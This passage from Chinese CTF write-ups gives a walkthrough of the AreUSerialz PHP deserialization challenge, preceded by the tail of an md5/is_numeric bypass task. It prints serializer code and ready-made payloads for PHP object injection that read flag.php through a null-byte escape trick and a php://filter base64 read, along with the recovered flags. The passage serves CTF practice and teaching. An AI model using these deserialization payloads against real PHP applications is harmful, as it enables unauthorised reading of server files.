>       - "==="；md5值强对比；id与gg的值不能相等；可通过数组并赋不同的值进行绕过。
> 
POST传参方式
>       - !is_numeric函数决定了passwd参数的值是数字或数字字符串，加个!就是相反的意思，如果passwd是数字字符串并等于1234567那么就会输出flag的值，如果不是那么就会进入else语句。

火狐浏览器传参<br />GET payload：<br />`?id[]=1&gg[]=2`<br />POST payload：<br />`passwd=1234567a`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700912843071-5ca749ca-622f-4c23-84ac-3bba497d62c5.png#averageHue=%23d6a160&clientId=u2735342b-9b67-4&from=paste&height=864&id=u53972d8a&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=161118&status=done&style=none&taskId=uba3d4d38-9287-40a1-a7b1-90a68a19b54&title=&width=1536)<br />**得到flag：**<br />`flag{95c8f35d-4ce2-4ba8-a849-2bbd941a75ea}`

原文链接：https://blog.csdn.net/m0_73734159/article/details/134619162?spm=1001.2014.3001.5501

## [网鼎杯 2020 青龙组]AreUSerialz 1 (两种解法 超详细！）

题目源码
```php
<?php

include("flag.php");

highlight_file(__FILE__);

class FileHandler {

    protected $op;
    protected $filename;
    protected $content;

    function __construct() {
        $op = "1";
        $filename = "/tmp/tmpfile";
        $content = "Hello World!";
        $this->process();
    }

    public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }

    private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }

    private function read() {
        $res = "";
        if(isset($this->filename)) {
            $res = file_get_contents($this->filename);
        }
        return $res;
    }

    private function output($s) {
        echo "[Result]: <br>";
        echo $s;
    }

    function __destruct() {
        if(op === "2")
            $this->op = "1";
        $this->content = "";
        $this->process();
    }

}

function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}

if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```
> 看着源码是很多，其实也不是很难，考察的还是那些东西。


PHP知识了解
> **PHP访问修饰符**
> **public  **                               公共的   任何成员都可以访问
> **private**                                私有的   只有自己可以访问
> 绕过方式：%00类名%00成员名
> **protected  **                         保护的   只有当前类的成员与继承该类的类才能访问
> 绕过方式：%00*%00成员名



> **PHP类**
> **class                                 **创建类


> **PHP关键字**
> function                               用于用户声明自定义函数
> $this->                                表示在类本身内部使用本类的属性或者方法
> isset                                     用来检测参数是否存在并且是否具有值



> **PHP常见函数**
> **include()                        **  包含函数        **                   **
> **highlight_file()**                   函数对文件进行语法高亮显示
> **file_put_contents()            **函数把一个字符串写入文件中
> **file_get_contents() **           函数把整个文件读入一个字符串中
> **is_valid()     **                        检查对象变量是否已经实例化，即实例变量的值是否是个有效的对象
> strlen                                   计算字符串长度
> ord                                      用于返回 "S" 的 ASCII值，其语法是ord(string)，参数string必需，指要从中获得ASCII值的字符串


> **PHP魔法函数**
> **__construct()    **                  实例化对象时被调用
> **__destruct()**                     当删除一个对象或对象操作终止时被调用


PHP代码审计
```php
public function process() {
        if($this->op == "1") {
            $this->write();
        } else if($this->op == "2") {
            $res = $this->read();
            $this->output($res);
        } else {
            $this->output("Bad Hacker!");
        }
    }
```
> 满足对象op=2
> 执行read读的操作

```php
private function write() {
        if(isset($this->filename) && isset($this->content)) {
            if(strlen((string)$this->content) > 100) {
                $this->output("Too long!");
                die();
            }
            $res = file_put_contents($this->filename, $this->content);
            if($res) $this->output("Successful!");
            else $this->output("Failed!");
        } else {
            $this->output("Failed!");
        }
    }
```
> 满足content<100
> 即可绕过
> 这段代码看着很长，其实不难分析
> 利用了函数strlen来检测content对象的字符串长度

```php
function is_valid($s) {
    for($i = 0; $i < strlen($s); $i++)
        if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125))
            return false;
    return true;
}
```
> 利用ord函数 返回 "S" 的 ASCII值 s为字符串类型 S为16进制字符串数据类型
> 绕过方式%00转换为\\00即可绕过

```php
if(isset($_GET{'str'})) {

    $str = (string)$_GET['str'];
    if(is_valid($str)) {
        $obj = unserialize($str);
    }

}
```
> GET方式传参
> 参数是str
> 将传入的值转为字符串类型
> 将str参数放入到自定义函数is_valid里面进行反序列化操作

**第一种解法 突破ord函数限制**<br />**序列化代码**
```php
<?php
  class FileHandler {
  protected $op = 2;
  protected $filename ='flag.php';         
 //题目中包含flag的文件
protected $content;

}
$bai = urlencode(serialize(new FileHandler)); 
//URL编码实例化后的类FileHandler序列化结果
$mao =str_replace('%00',"\\00",$bai);    
//str_replace函数查找变量bai里面的数值%00并将其替换为\\00
$mao =str_replace('s','S',$mao);         
//str_replace函数查找变量mao里面的数值s并将其替换为S
echo $mao                                               
//打印结果
?>
```
**序列化结果**<br />`O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BN%3B%7D`<br />**构造payload**<br />`?str=O%3A11%3A%22FileHandler%22%3A3%3A%7BS%3A5%3A%22\00%2A\00op%22%3Bi%3A2%3BS%3A11%3A%22\00%2A\00filename%22%3BS%3A8%3A%22flag.php%22%3BS%3A10%3A%22\00%2A\00content%22%3BN%3B%7D`<br />**上传payload**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701072490180-607e7eaf-a372-45d3-9bfc-0bd9d696b3a8.png#averageHue=%23fdfdfd&clientId=u9f406969-d7c2-4&from=paste&height=817&id=uf470b1a3&originHeight=1021&originWidth=1914&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=83691&status=done&style=none&taskId=u3c9078d1-105e-4a56-a59f-04c334c594c&title=&width=1531.2)<br />**F12**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701072530293-ea3e6471-6e7f-4cae-9c0b-a153995ab63e.png#averageHue=%23f9f9f8&clientId=u9f406969-d7c2-4&from=paste&height=225&id=u48a8d014&originHeight=281&originWidth=1913&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=40736&status=done&style=none&taskId=u7fcdce36-461a-467b-91c4-0b3cf54c482&title=&width=1530.4)<br />**得到flag：**<br />`flag{e2857c82-19b2-41a5-881e-ecc0c5883d5b}`<br />**第二种解法 突破protected访问修饰符限制**
> 这个关键点是将受保护的对象转换成公共对象

**序列化代码**
```php
<?php
  class FileHandler {
  protected $op = 2;
  protected $filename ='php://filter/read=convert.base64-encode/resource=flag.php';             
//php://filter伪协议
protected $content;

}
$baimao=serialize(new FileHandler());
//实例化并序列化类FileHandler
echo $baimao;
//打印结果
?>
```
**序列化结果**<br />`O:11:"FileHandler":3:{s:5:" * op";i:2;s:11:" * filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:10:" * content";N;}`<br />**删除乱码并减去相应长度**<br />`O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}`<br />**构造payload**<br />`?str=O:11:"FileHandler":3:{s:2:"op";i:2;s:8:"filename";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";s:7:"content";N;}`<br />**上传payload**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701073769668-abbdd717-784d-4a3f-9939-cbd1e7658c1a.png#averageHue=%23fdfcfc&clientId=u9f406969-d7c2-4&from=paste&height=823&id=u7206cf3f&originHeight=1029&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=87015&status=done&style=none&taskId=u7b2dc687-8e27-4636-bbef-5b086e4a111&title=&width=1536)<br />**回显结果**<br />`PD9waHAgJGZsYWc9J2ZsYWd7ZTI4NTdjODItMTliMi00MWE1LTg4MWUtZWNjMGM1ODgzZDVifSc7Cg==`<br />**base64解码**<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1701074088247-3b6732d1-005c-403c-8995-922584ed4179.png#averageHue=%23262933&clientId=u9f406969-d7c2-4&from=paste&height=142&id=uad985f93&originHeight=178&originWidth=1432&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=180787&status=done&style=none&taskId=u3cf6220d-9de5-40b1-a6e9-4c52d302c51&title=&width=1145.6)<br />**得到flag：**<br />`flag{e2857c82-19b2-41a5-881e-ecc0c5883d5b}`

原文链接：https://blog.csdn.net/m0_73734159/article/details/134648981?spm=1001.2014.3001.5501




































